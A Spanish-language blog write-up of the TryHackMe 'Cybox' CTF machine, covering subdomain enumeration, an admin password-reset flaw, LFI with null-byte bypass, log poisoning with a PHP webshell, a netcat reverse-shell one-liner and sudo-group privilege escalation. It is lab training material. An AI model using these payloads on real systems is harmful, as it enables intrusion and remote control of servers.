<!DOCTYPE html><html lang="ja-JP" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Tryhackme - Cybox (CTF UPSA 2020)" /><meta name="author" content="nik0" /><meta property="og:locale" content="ja_JP" /><meta name="description" content="Blog de Ciberseguridad" /><meta property="og:description" content="Blog de Ciberseguridad" /><link rel="canonical" href="/posts/THM-Cybox/" /><meta property="og:url" content="/posts/THM-Cybox/" /><meta property="og:site_name" content="Nik0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-05T15:57:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Tryhackme - Cybox (CTF UPSA 2020)" /><meta name="twitter:site" content="@" /><meta name="twitter:creator" content="@nik0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"nik0"},"dateModified":"2020-12-05T15:57:00-03:00","datePublished":"2020-12-05T15:57:00-03:00","description":"Blog de Ciberseguridad","headline":"Tryhackme - Cybox (CTF UPSA 2020)","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/THM-Cybox/"},"url":"/posts/THM-Cybox/"}</script><title>Tryhackme - Cybox (CTF UPSA 2020) | Nik0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nik0"><meta name="application-name" content="Nik0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/saikyosan.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nik0</a></div><div class="site-subtitle font-italic">Ciberseguridad</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVOS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nik0sec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="" aria-label="" class="order-4" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="https://www.linkedin.com/in/nik0/" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="" aria-label="" class="order-6" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" class="order-7" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" class="order-8" target="_blank" rel="noopener"> <i class=""></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Tryhackme - Cybox (CTF UPSA 2020)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Tryhackme - Cybox (CTF UPSA 2020)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> nik0 </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Dec 5, 2020, 3:57 PM -0300" prep="on" > Dec 5, 2020 <i class="unloaded">2020-12-05T15:57:00-03:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="911 words">5 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/CYBEX.png" alt="CYBEX" /></p><h2 id="introducción">Introducción</h2><p>En ese write up, veremos la máquina creada por <a href="https://twitter.com/takito1812?s=20">@takito1812</a> Sirve para Virtual box y VMware, yo lo hice en VMware y usé tryhackme para poder conectarme a la máquina, aquí les dejo el código de la room: <code class="language-plaintext highlighter-rouge">1337ctfupsa2020cybox</code> muy entretenida máquina, la verdad me tuvo un rato peleando con los dominios que habían etc, pero eso lo aclaramos más adelante ;)</p><h2 id="datos-importantes">Datos importantes</h2><p>Para este CTF es muy importante tener en cuenta el email del administrador y el dominio de la página, se pueden encontrar en el footer de la página.</p><p>Email: admin@cybox.company Dominio: cybox.company</p><h2 id="añadir-dominio-a-etchosts">Añadir dominio a /etc/hosts</h2><p>Primero necesitamos añadir a /etc/hosts la ip y el dominio del sitio</p><p>Ej: <ipMáquinaCybox> <dominio></dominio></ipMáquinaCybox></p><h2 id="enumerando-subdominios-con-gobuster">Enumerando subdominios con gobuster</h2><p>con el comando <code class="language-plaintext highlighter-rouge">gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url http://cybox.company/</code></p><p>Encontramos los siguientes subdominios:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/1.png" alt="1" /></p><p>los subdominios encontrados los añadimos al /etc/hosts para luego poder ingresar a cada uno de ellos y poder interactuar con ellos</p><p>esto se ve en: ftp.cybox.company <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/2.png" alt="2" /></p><p>esto se ve en: monitor.cybox.company <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/3.png" alt="3" /></p><p>esto se ve en: dev.cybox.company <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/4.png" alt="4" /></p><p>esto se ve en: register.cybox.company <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/6.png" alt="6" /></p><p>esto se ve en: webmail.cybox.company <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/5.png" alt="5" /></p><h2 id="encontrando-la-vulnerabilidad">Encontrando la vulnerabilidad</h2><p>Primero nos metemos a los subdominios y vemos que en register.cybox.company hay un sistema para crear usuarios, en este caso me creo un usuario llamado “nadie” y luego que le damos a create, nos da un correo nadie@cybox.company y unas credenciales “nadie:nadie”</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/7.png" alt="7" /></p><p>Ahora nos vamos a monitor.cybox.company y vemos un panel donde hay un login, procedemos a registrarnos con el correo que anteriormente obtuvimos, una vez registrados le damos click a “forgot password” e ingresamos nuestro correo, en este caso sería “nadie@cybox.company”</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/9.png" alt="9" /></p><p>Luego nos llegará al correo un mensaje para poder cambiar la contraseña, para esto vamos a webmail@cybox.company, nos logueamos con las credenciales que nos dieron en register.cybox.company</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/10.png" alt="10" /></p><p>Luego clickeamos el link: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/11.png" alt="11" /></p><p>Vemos que se puede cambiar la contraseña, aunque si nos fijamos en la URL <code class="language-plaintext highlighter-rouge">http://monitor.cybox.company/updatePasswordRequest.php?email=nadie@cybox.company</code> en la parte del usuario “nadie” la podemos cambiar por el email del admin para ingresar una nueva contraseña, esto es un fallo de programación, entonces la URL quedaría así <code class="language-plaintext highlighter-rouge">http://monitor.cybox.company/updatePasswordRequest.php?email=admin@cybox.company</code></p><p>Ahora tenemos que cambiar la contraseña del admin, a cualquiera que nosotros queramos</p><p>Luego volvemos al panel y nos logueamos cómo admin:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/13.png" alt="13" /></p><p>Si todo salió bien, deberíamos haber ingresado cómo Admin:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/14.png" alt="14" /></p><p>Ingresamos al admin panel y nos sale esto:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/15.png" alt="15" /></p><p>Vemos el código fuente:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/16.png" alt="16" /></p><p>Observamos un link <code class="language-plaintext highlighter-rouge">styles.php?style=general</code> clickeamos y nos sale esto:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/17.png" alt="17" /></p><p>Podemos inferir que esto es una vulnerabilidad LFI, ya que la página carga archivos del sitio</p><h2 id="lfi-a-rce">LFI a RCE</h2><p>Ya sabemos que puede ser una vulnerabilidad LFI, lo comprobamos añadiendo “../” a la URL y al final un directorio del sistema Linux en este caso “/etc/passwd”, entonces la URL quedaría así:</p><p><code class="language-plaintext highlighter-rouge">view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../../etc/paswd</code></p><p>Si no nos muestra nada, es por que la extensión del archivo es .css, para poder bypassear esto, podemos usar un nullbyte “%00”</p><p><code class="language-plaintext highlighter-rouge">view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../../etc/paswd%00</code></p><p>Y si todo sale bien, se debería ver así:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/18.png" alt="18" /></p><p>Ahora confirmamos que es un LFI, tenemos que plantar una shell en el sitio, para ello revisamos información en el subdominio “dev.cybox.company” y vemos la info del apache, si nos fijamos bien, en “extension_dir” sale una ruta que utiliza Bitnami, si buscamos en google la <a href="https://docs.bitnami.com/aws/apps/elk/troubleshooting/debug-errors-apache/">Documentación</a> nos sale donde se almacenan los logs de apache, en este caso se almacenan en “opt/bitnami/apache2/logs/access_log”.</p><p>IMPORTANTE: para poder ingresar a los logs, debemos primero ingresar a la página donde se aloja el ftp, en este caso sería “ftp.cybox.company”</p><p>Ahora ingresamos a los logs, con la URL <code class="language-plaintext highlighter-rouge">view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../opt/bitnami/apache2/logs/access_log%00</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/19.png" alt="19" /></p><h2 id="webshell">Webshell</h2><p>Una Webshell nos permite ejecutar comandos a nivel sistema ;)</p><p>Ahora tenemos que inyectar código php en los logs que se almacenan en el ftp, para ello abrimos Burpsuite y editamos el user-agent en la página del ftp</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/20.png" alt="20" /></p><p>Código a inyectar: &lt;?php system($_GET[‘c’]); ?&gt;</p><p>Y le damos forward</p><p>Si todo salió bien, podríamos ejecutar comandos a nivel sistema, cómo se ve en la imagen:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/21.png" alt="21" /></p><p>así sería la sintáxis para poder ejecutar comandos en el sistema, URL: view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../../opt/bitnami/apache2/logs/access_log%00?&amp;c=ls -la</p><h2 id="reverse-shell">Reverse Shell</h2><p>Ahora que tenemos nuestra Webshell, podemos ejecutar comandos a nivel sistema, es momento de plantar una reverse shell, más abajo les dejo una, pero para que funcione primero debemos codificarla para que sea admitida por la URL, para ellos utilizaremos Burpsuite</p><div class="table-wrapper"><table><tbody><tr><td>Reverse Shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f<td>/bin/sh -i 2&gt;&amp;1<td>nc 10.0.x.x 443 &gt;/tmp/f</table></div><p>IMPORTANTE: recuerden cambiar la ip de la reverse shell por la de tun0 ;)</p><p>Ahora cómo se ve en la imagen, codificamos nuestra rev shell en encoder:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/22.png" alt="22" /></p><p>Lo de abajo es nuestra reverse shell, CTRL + A para copiar todo</p><p>No ejecutarla aún!!!</p><p>Tenemos que poner netcat a la escucha, con el comando <code class="language-plaintext highlighter-rouge">nc -lvnp 443</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/23.png" alt="23" /></p><p>Y ahora si ejecutamos nuestra reverse shell, sí nos queda así cómo “cargando” es normal</p><p>Ahora nos vamos a netcat y vemos que tenemos nuestra conexión reversa:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/25.png" alt="25" /></p><p>Podemos hacer nuestra shell full TTY para que sea más fácil moverse por la terminal</p><h2 id="escalando-privilegios">Escalando Privilegios</h2><p>Una vez dentro, podemos probar a buscar binarios SUID, con el comando <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/26.png" alt="26" /></p><p>El directorio /opt/ se ve interesante</p><p>Ingresamos y vemos que hay un ejecutable para crear usuarios</p><p>Entonces este script lo que hace es crear un usuario y añadirlo al grupo con el mismo nombre, si nosotros nos creamos un usuario sudo, nos va a añadir al grupo sudo y ahí explotaríamos el fallo obteniendo la flag de root</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/27.png" alt="27" /></p><p>Hacemos un sudo -i y hacemos un cat para ver la flag ;)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/28.png" alt="27" /></p><div class="table-wrapper"><table><tbody><tr><td>y también si queremos sacar el user, lo podemos hacer con un “find /<td>grep “user.txt”</table></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/cybox/29.png" alt="29" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/write-up/'>Write up</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >THM</a> <a href="/tags/cybox/" class="post-tag no-text-decoration" >Cybox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Tryhackme - Cybox (CTF UPSA 2020) - Nik0&url=/posts/THM-Cybox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Tryhackme - Cybox (CTF UPSA 2020) - Nik0&u=/posts/THM-Cybox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Tryhackme - Cybox (CTF UPSA 2020) - Nik0&url=/posts/THM-Cybox/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Talkative/">HackTheBox - Talkative</a></ul></div><div id="access-tags"> <span>Tags Populares</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/bandit/">Bandit</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/0day/">0day</a> <a class="post-tag" href="/tags/anonymous/">Anonymous</a> <a class="post-tag" href="/tags/bountyhacker/">BountyHacker</a> <a class="post-tag" href="/tags/cybox/">Cybox</a> <a class="post-tag" href="/tags/dailybugle/">DailyBugle</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/hard/">Hard</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Seguir Leyendo</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Wonderland-THM/"><div class="card-body"> <span class="timeago small" > Jan 15, 2021 <i class="unloaded">2021-01-15T15:10:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Wonderland</h3><div class="text-muted small"><p> Introducción En este write up veremos la máquina Wonderland de Tryhackme, lo interesante de esta máquina es que no hay pistas de cómo resolverla así que debemos ir descubriendo las vulnerabilida...</p></div></div></a></div><div class="card"> <a href="/posts/PickleRick/"><div class="card-body"> <span class="timeago small" > Jan 17, 2021 <i class="unloaded">2021-01-17T04:02:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Pickle Rick</h3><div class="text-muted small"><p> Introducción En este write up veremos la máquina Pickle Rick, donde hay que encontrar 3 “ingredientes” para ayudar a Rick a ser humano denuevo, esta máquina en particular no nos da pistas explíc...</p></div></div></a></div><div class="card"> <a href="/posts/Kenobi/"><div class="card-body"> <span class="timeago small" > Jan 17, 2021 <i class="unloaded">2021-01-17T09:27:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Kenobi</h3><div class="text-muted small"><p> Introducción En este write up de la máquina Kenobi, veremos temas cómo manipular una versión vulnerable de proftpd para ganar acceso inicial y escalar privilegios con binarios SUID Acceso Inici...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/OverTheWire07/" class="btn btn-outline-primary" prompt="Antiguos"><p>OverTheWire - Bandit 7</p></a> <a href="/posts/MrRobot-THM/" class="btn btn-outline-primary" prompt="Nuevos"><p>Tryhackme - Mr Robot</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/nik0sec">Nik0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">;).</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Tags Populares</h4><a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/bandit/">Bandit</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/0day/">0day</a> <a class="post-tag" href="/tags/anonymous/">Anonymous</a> <a class="post-tag" href="/tags/bountyhacker/">BountyHacker</a> <a class="post-tag" href="/tags/cybox/">Cybox</a> <a class="post-tag" href="/tags/dailybugle/">DailyBugle</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/hard/">Hard</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<center><img src="/assets/gifo.gif" alt="john"></center> ', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
